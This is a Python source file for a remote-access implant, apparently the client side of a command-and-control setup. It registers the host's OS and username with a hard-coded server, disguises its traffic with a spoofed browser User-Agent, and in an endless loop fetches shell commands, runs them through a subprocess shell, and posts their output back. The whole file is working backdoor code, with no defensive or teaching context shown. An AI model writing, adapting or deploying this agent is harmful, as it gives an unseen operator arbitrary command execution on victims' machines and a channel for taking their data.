import aiohttp
import asyncio
import os
import uuid
import uuid
import platform
import getpass


SERVER = "http://127.0.0.1:8080"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) "
                  "AppleWebKit/537.36 (KHTML, like Gecko) "
                  "Chrome/35.0.1916.47 Safari/537.36",
    "Authorization": "Bearer valid" + "X" * 254
}

cwd = os.getcwd()  # current working directory



CLIENT_ID_FILE = "client_id.txt"
if os.path.exists(CLIENT_ID_FILE):
    with open(CLIENT_ID_FILE, "r") as f:
        CLIENT_ID = f.read().strip()
else:
    CLIENT_ID = str(uuid.uuid4())
    with open(CLIENT_ID_FILE, "w") as f:
        f.write(CLIENT_ID)

# System info
OS_INFO = platform.system() + " " + platform.release()
USERNAME = getpass.getuser()


async def register_client(session):
    payload = {
        "client_id": CLIENT_ID,
        "os": OS_INFO,
        "username": USERNAME
    }
    try:
        async with session.post(f"{SERVER}/register", headers=HEADERS, json=payload) as resp:
            if resp.status == 200:
                data = await resp.json()
                print(f"[*] Registered with server: {data}")
            else:
                print("[!] Registration failed:", resp.status)
                return False
    except Exception as e:
        print("[!] Registration error:", e)
        return False
    return True




async def send_result(session, command, output):
    async with session.post(f"{SERVER}/validatiion/result", headers=HEADERS, json={"command": command, "output": output}) as resp:
        print(f"[*] Sent result: {resp.status}")

async def run_command(cmd):
    global cwd
    if cmd.startswith("cd "):
        path = cmd[3:].strip()
        new_dir = os.path.abspath(path if os.path.isabs(path) else os.path.join(cwd, path))
        if os.path.isdir(new_dir):
            cwd = new_dir
            return f"[*] Directory changed to {cwd}"
        else:
            return f"[!] Directory does not exist: {path}"
    else:
        proc = await asyncio.create_subprocess_shell(
            cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.STDOUT,
            cwd=cwd
        )
        stdout, _ = await proc.communicate()
        return stdout.decode()

async def checkin_loop():
    async with aiohttp.ClientSession() as session:
        while True:
            try:
                async with session.get(f"{SERVER}/validate/status", headers=HEADERS) as resp:
                    if resp.status == 200:
                        commands = await resp.json()
                        for cmd in commands:
                            if cmd.lower() == "exit_now":
                                print("[*] Exiting")
                                return
                            output = await run_command(cmd)
                            await send_result(session, cmd, output)
                    else:
                        print("[!] Server check-in failed:", resp.status)
            except Exception as e:
                print("[!] Error:", e)

async def main():
    async with aiohttp.ClientSession() as session:
        async with session.get(f"{SERVER}/initializee/sequence/0", headers=HEADERS) as resp:
            print("[*] Init:", await resp.text())
            
        registered = await register_client(session)
        if not registered:
            print("[!] Could not register, exiting...")
            return
        
    await checkin_loop()

asyncio.run(main())
